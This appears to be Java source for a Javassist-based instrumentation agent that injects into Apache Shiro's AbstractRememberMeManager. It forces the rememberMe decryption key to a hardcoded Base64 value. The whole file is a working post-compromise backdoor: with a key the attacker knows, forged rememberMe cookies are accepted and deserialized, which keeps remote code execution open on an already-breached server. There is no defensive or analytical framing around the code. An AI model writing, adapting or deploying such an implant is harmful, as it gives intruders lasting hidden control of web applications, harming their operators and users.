import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class ChangeShiroKeyTransformer implements ClassFileTransformer {
    public static final String editClassName = "org.apache.shiro.mgt.AbstractRememberMeManager";
    public static final String editClassName2 = editClassName.replace('.', '/');
    public static final String editMethod = "getDecryptionCipherKey";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println("start inject");
        if (!className.equals(editClassName2)) return null;
        try {
            ClassPool cp = ClassPool.getDefault();
            cp.appendClassPath(new LoaderClassPath(loader));

            CtClass ctc = cp.get(editClassName);
            CtMethod method = ctc.getDeclaredMethod(editMethod);
            String source = "$0.setCipherKey(org.apache.shiro.codec.Base64.decode(\"4AvVhmFLUs0KTA3Kprsdag==\"));";
            method.insertBefore(source);

            // setBody()
//            {
//                return (org.apache.shiro.codec.Base64.decode("4AvVhmFLUs0KTA3Kprsdag=="));
//            }

            byte[] bytes = ctc.toBytecode();
            ctc.detach();
            System.out.println("inject success");
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
